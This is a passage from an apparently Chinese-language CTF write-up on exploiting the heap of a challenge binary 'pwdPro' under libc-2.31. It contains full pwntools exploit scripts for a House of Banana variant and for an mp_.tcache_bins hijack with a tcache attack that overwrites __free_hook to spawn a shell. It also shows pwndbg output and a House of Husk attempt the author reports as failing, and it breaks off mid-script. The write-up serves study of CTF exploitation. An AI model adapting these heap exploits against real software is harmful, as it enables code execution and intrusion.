class="string">&#x27;libc_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">recover(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Pwd is: &#x27;</span>)</span><br><span class="line">leak_addr=u64(p.recv(<span class="number">8</span>))</span><br><span class="line">heap_base = (leak_addr ^ key)-<span class="number">656</span></span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;heap_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">rtld_global=libc_base+<span class="number">0x222060</span></span><br><span class="line">next_node=rtld_global-<span class="number">0x2ff48</span></span><br><span class="line">success(<span class="string">&#x27;rtld_global &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(rtld_global))</span><br><span class="line">success(<span class="string">&#x27;next_node &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(next_node))</span><br><span class="line"></span><br><span class="line">one_gadget_list=[<span class="number">0xe6aee</span>,<span class="number">0xe6af1</span>,<span class="number">0xe6af4</span>]</span><br><span class="line">one_gadget=one_gadget_list[<span class="number">0</span>]+libc_base</span><br><span class="line">success(<span class="string">&#x27;one_gadget &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line"></span><br><span class="line">main_arena=libc_base+<span class="number">2015200</span></span><br><span class="line">chunk0_addr=heap_base+<span class="number">656</span></span><br><span class="line">chunk2_addr=heap_base+<span class="number">2848</span></span><br><span class="line"></span><br><span class="line">fake_addr=chunk0_addr</span><br><span class="line">fake=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">8</span></span><br><span class="line">fake=fake.ljust(<span class="number">0x28</span>-<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake+=p64(fake_addr)</span><br><span class="line">fake=fake.ljust(<span class="number">0x48</span>-<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake+=p64(fake_addr+<span class="number">0x58</span>)</span><br><span class="line">fake+=p64(<span class="number">0x8</span>)</span><br><span class="line">fake+=p64(one_gadget)</span><br><span class="line">fake=fake.ljust(<span class="number">0x110</span>-<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake+=p64(fake_addr+<span class="number">0x40</span>)</span><br><span class="line">fake=fake.ljust(<span class="number">0x120</span>-<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake+=p64(fake_addr+<span class="number">0x48</span>)</span><br><span class="line">fake=fake.ljust(<span class="number">0x31c</span>-<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake+=p64(<span class="number">0x1c</span>)</span><br><span class="line"></span><br><span class="line">payload1= p64(main_arena)+p64(main_arena)</span><br><span class="line">payload1+=p64(chunk2_addr)+p64(next_node-<span class="number">0x20</span>)</span><br><span class="line">payload2= p64(main_arena)+p64(<span class="number">0</span>)</span><br><span class="line">payload2+=p64(chunk0_addr)+p64(chunk0_addr)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x438</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x500</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">0</span>,fake)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">2</span>,payload1)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x500</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">recover(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload2)</span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><strong>mp_.tcache_bins劫持 + Tcache attack</strong></p>
<p>这里的 mp_.tcache_bins 的作用就相当于是 global max fast ，将其改成一个很大的地址之后，再次释放的堆块就会当作 tcache 来进行处理 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;mp_.tcache_bins</span><br><span class="line">$<span class="number">1</span> = (<span class="keyword">size_t</span> *) <span class="number">0x7f5303de82d0</span> &lt;mp_+<span class="number">80</span>&gt;</span><br><span class="line">pwndbg&gt; telescope <span class="number">0x7f5303de82d0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7f5303de82d0</span> (mp_+<span class="number">80</span>) ◂— <span class="number">0x40</span> <span class="comment">/* 通常为0x40 */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;mp_.tcache_bins</span><br><span class="line">$<span class="number">2</span> = (<span class="keyword">size_t</span> *) <span class="number">0x7f5303de82d0</span> &lt;mp_+<span class="number">80</span>&gt;</span><br><span class="line">pwndbg&gt; telescope <span class="number">0x7f5303de82d0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7f5303de82d0</span> (mp_+<span class="number">80</span>) —▸ <span class="number">0x5593fe267290</span> ◂— <span class="number">0x0</span> <span class="comment">/* 改为一个很大的数据 */</span></span><br></pre></td></tr></table></figure>
<p>前面部分和 House Of Banana 一样，只是换一下攻击对象就可以了</p>
<p>此后释放的 chunk 都会放入 tcache（小于mp_.tcache_bins）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="comment">/* 在tcache_perthread_struct看到的信息(它的tcache_entry和main_arena很像) */</span></span><br><span class="line"><span class="number">60</span>:<span class="number">0300</span>│  <span class="number">0x56094bbaf300</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">61</span>:<span class="number">0308</span>│  <span class="number">0x56094bbaf308</span> —▸ <span class="number">0x56094bbb08e0</span> —▸ <span class="number">0x56094bbb0df0</span> ◂— <span class="number">0x0</span></span><br><span class="line">    <span class="comment">/* tcache_entry(0x510):chunk6-&gt;next =&gt; chunk7-&gt;next */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x56094bbb03c0</span> <span class="comment">/* chunk5 */</span></span><br><span class="line">Size: <span class="number">0x511</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x56094bbb08d0</span> <span class="comment">/* chunk6 */</span></span><br><span class="line">Size: <span class="number">0x511</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x56094bbb0de0</span> <span class="comment">/* chunk7 */</span></span><br><span class="line">Size: <span class="number">0x511</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x56094bbb12f0</span> <span class="comment">/* chunk8 */</span></span><br><span class="line">Size: <span class="number">0x511</span></span><br></pre></td></tr></table></figure>
<p>因为 libc-2.31 的 tcache 中加了 key 来检测 Double free，所以这里直接攻击 tcache_entry </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="comment">/* tcache_entry(0x510) */</span></span><br><span class="line"><span class="number">60</span>:<span class="number">0300</span>│  <span class="number">0x56094bbaf300</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">61</span>:<span class="number">0308</span>│  <span class="number">0x56094bbaf308</span> —▸ <span class="number">0x56094bbb08e0</span> —▸ <span class="number">0x7f60e60c4b28</span> (__free_hook) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="comment">/* 直接在chunk6中写入free_hook,覆盖chunk7的位置 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>这里最好不要在 chunk7 中写入free_hook，因为 tcache_perthread_struct-&gt;count 会记录各个 tcachebin 中的 chunk 数量（其实也可以伪造 count，就是有点麻烦）</li>
</ul>
<p>注意：这里我尝试使用“one_gadget”没有打通（可能是条件不符合）</p>
<p>完整exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./pwdPro&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./pwdPro&#x27;</span>) </span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwdPro&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,<span class="built_in">len</span>,pwd</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Input Your Choice:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Which PwdBox You Want Add:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Input The ID You Want Save:&#x27;</span>,<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Length Of Your Pwd:&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Your Pwd:&#x27;</span>,pwd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,pwd</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Input Your Choice:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Which PwdBox You Want Edit:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendline(pwd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Input Your Choice:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Which PwdBox You Want Check:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Input Your Choice:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Idx you want 2 Delete:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">		</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recover</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Input Your Choice:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Idx you want 2 Recover:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span>():</span>	</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Input Your Choice:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x438</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;First Add Done.Thx 4 Use. Save ID:&#x27;</span>)</span><br><span class="line">key=u64(p.recv(<span class="number">8</span>))</span><br><span class="line">success(<span class="string">&#x27;key &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(key))</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x448</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x448</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x448</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">recover(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Pwd is: &#x27;</span>)</span><br><span class="line">leak_addr=u64(p.recv(<span class="number">8</span>))</span><br><span class="line">libc_base = (leak_addr ^ key) - <span class="number">0x1ebbe0</span></span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;libc_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">recover(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Pwd is: &#x27;</span>)</span><br><span class="line">leak_addr=u64(p.recv(<span class="number">8</span>))</span><br><span class="line">heap_base = (leak_addr ^ key)-<span class="number">656</span></span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;heap_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">mp=libc_base+<span class="number">2011856</span></span><br><span class="line">one_gadget_list=[<span class="number">0xe6aee</span>,<span class="number">0xe6af1</span>,<span class="number">0xe6af4</span>]</span><br><span class="line">one_gadget=one_gadget_list[<span class="number">0</span>]+libc_base</span><br><span class="line">system_libc=libc.sym[<span class="string">&#x27;system&#x27;</span>]+libc_base</span><br><span class="line">free_hook=libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]+libc_base</span><br><span class="line">success(<span class="string">&#x27;mp &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(mp))</span><br><span class="line">success(<span class="string">&#x27;one_gadget &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line">success(<span class="string">&#x27;system_libc &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(system_libc))</span><br><span class="line">success(<span class="string">&#x27;free_hook &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line">main_arena=libc_base+<span class="number">2015200</span></span><br><span class="line">chunk0_addr=heap_base+<span class="number">656</span></span><br><span class="line">chunk2_addr=heap_base+<span class="number">2848</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x438</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x500</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload1= p64(main_arena)+p64(main_arena)</span><br><span class="line">payload1+=p64(chunk2_addr)+p64(mp-<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">2</span>,payload1)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x500</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x500</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x500</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">recover(<span class="number">6</span>)</span><br><span class="line">edit(<span class="number">6</span>,p64(free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x500</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x500</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">7</span>,p64(system_libc))</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><strong>House Of Husk</strong></p>
<p>在常规 House Of Husk 中，需要先攻击 global_max_fast</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;global_max_fast</span><br><span class="line">$<span class="number">2</span> = (<span class="keyword">size_t</span> *) <span class="number">0x7f0da6b5fb80</span> &lt;global_max_fast&gt;</span><br><span class="line">pwndbg&gt; telescope <span class="number">0x7f0da6b5fb80</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7f0da6b5fb80</span> (global_max_fast) ◂— <span class="number">0x80</span> <span class="comment">/* 默认0x80 */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;global_max_fast</span><br><span class="line">$<span class="number">3</span> = (<span class="keyword">size_t</span> *) <span class="number">0x7f0da6b5fb80</span> &lt;global_max_fast&gt;</span><br><span class="line">pwndbg&gt; telescope <span class="number">0x7f0da6b5fb80</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7f0da6b5fb80</span> (global_max_fast) —▸ <span class="number">0x560b35d78290</span> <span class="comment">/* 改为大数据 */</span></span><br></pre></td></tr></table></figure>
<p>然后就是计算两个表的偏移：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; distance &amp;__printf_function_table &amp;main_arena</span><br><span class="line"><span class="number">0x7f0da6b61ff8</span>-&gt;<span class="number">0x7f0da6b5cb80</span> is <span class="number">-0x5478</span> bytes (<span class="number">-0xa8f</span> words)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; distance &amp;__printf_arginfo_table &amp;main_arena</span><br><span class="line"><span class="number">0x7f0da6b62350</span>-&gt;<span class="number">0x7f0da6b5cb80</span> is <span class="number">-0x57d0</span> bytes (<span class="number">-0xafa</span> words)</span><br></pre></td></tr></table></figure>
<p>可惜的是，程序对 size 进行了限制，那么常规的 House Of Husk 就无法实施了（利用 main_arena 覆盖 <code>__printf_function_table</code> 和 <code>__printf_arginfo_table</code>），但是可以用连续的 largebin attack 来代替这个过程</p>
<p>注意：libc-2.31版本下 largebin attack 的条件（必须小于 largebin 中所有的 chunk）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p __printf_arginfo_table</span><br><span class="line">$<span class="number">1</span> = (printf_arginfo_size_function **) <span class="number">0x55ac618778d0</span> <span class="comment">/* chunk10 */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p __printf_function_table</span><br><span class="line">$<span class="number">2</span> = (printf_function **) <span class="number">0x55ac61876b20</span> <span class="comment">/* chunk2 */</span></span><br></pre></td></tr></table></figure>
<p>当我执行到最后一步时，悲剧还是发生了：</p>
<ul>
<li>所有 one_gadget 的条件都不满足</li>
<li>Rdi 指向栈上的一个地址，导致 system 的参数不可控</li>
</ul>
<p>看来 House Of Husk 打不通这个题，完整exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./pwdPro&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./pwdPro&#x27;</span>) </span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwdPro&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,<span class="built_in">len</span>,pwd</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Input Your Choice:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Which PwdBox You Want Add:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Input The ID You Want Save:&#x27;</span>,<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Length Of Your Pwd:&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Your Pwd:&#x27;</span>,pwd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,pwd</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Input Your Choice:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Which PwdBox You Want Edit:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendline(pwd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Input Your Choice:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Which PwdBox You Want Check:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Input Your Choice:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Idx you want 2 Delete:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">		</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recover</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Input Your Choice:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Idx you want 2 Recover:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span>():</span>	</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Input Your Choice:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line">	</span><br><span class="line">gdb.attach(p,<span class="string">&quot;b* 